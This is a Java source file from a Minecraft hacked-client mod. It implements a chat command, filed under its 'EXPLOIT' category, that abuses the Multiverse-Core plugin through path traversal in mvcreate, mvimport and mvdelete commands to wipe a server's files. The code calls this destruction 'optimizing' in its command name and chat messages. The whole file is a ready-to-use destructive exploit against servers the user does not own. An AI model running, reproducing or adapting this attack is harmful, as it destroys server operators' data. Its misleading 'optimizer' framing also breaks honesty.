/*
 * This file is part of Vandalism - https://github.com/NekosAreKawaii/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, FooFieOwO, Recyz and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.feature.command.impl.exploit.plugin;

import com.mojang.brigadier.arguments.LongArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import de.nekosarekawaii.vandalism.feature.command.Command;
import de.nekosarekawaii.vandalism.util.ChatUtil;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.command.CommandSource;

public class MultiverseCoreOptimizerCommand extends Command {

    public MultiverseCoreOptimizerCommand() {
        super(
                "Allows you to delete an entire minecraft server where Multiverse-Core is installed on.",
                Category.EXPLOIT,
                "multiversecoreoptimizer",
                "mvoptimizer",
                "richardskatze"
        );
    }

    @Override
    public void build(final LiteralArgumentBuilder<CommandSource> builder) {
        builder.executes(context -> {
            this.optimizeWithMultiverseCore(2500, "logs");
            return SINGLE_SUCCESS;
        });
        builder.then(argument("delay", LongArgumentType.longArg(1000, 15000))
                .then(argument("directory", StringArgumentType.greedyString())
                        .executes(context -> {
                            this.optimizeWithMultiverseCore(LongArgumentType.getLong(context, "delay"), StringArgumentType.getString(context, "directory"));
                            return SINGLE_SUCCESS;
                        })
                )
        );
    }

    private void optimizeWithMultiverseCore(final long delay, final String directory) {
        ChatUtil.infoChatMessage("Multiverse-Core will now be optimized...");
        new Thread(() -> {
            if (mc.getNetworkHandler() != null) {
                try {
                    final ClientPlayNetworkHandler networkHandler = mc.getNetworkHandler();
                    networkHandler.sendChatCommand("mvcreate " + directory + "/..//uid.Dat normal");
                    Thread.sleep(delay);
                    networkHandler.sendChatCommand("mvimport " + directory + "/..// normal");
                    Thread.sleep(delay);
                    networkHandler.sendChatCommand("mvdelete " + directory + "/..//");
                    Thread.sleep(delay);
                    networkHandler.sendChatCommand("mv confirm");
                } catch (Throwable ignored) {
                    ChatUtil.errorChatMessage("An error occurred while optimizing the server with Multiverse-Core.");
                }
            }
        }).start();
    }

}
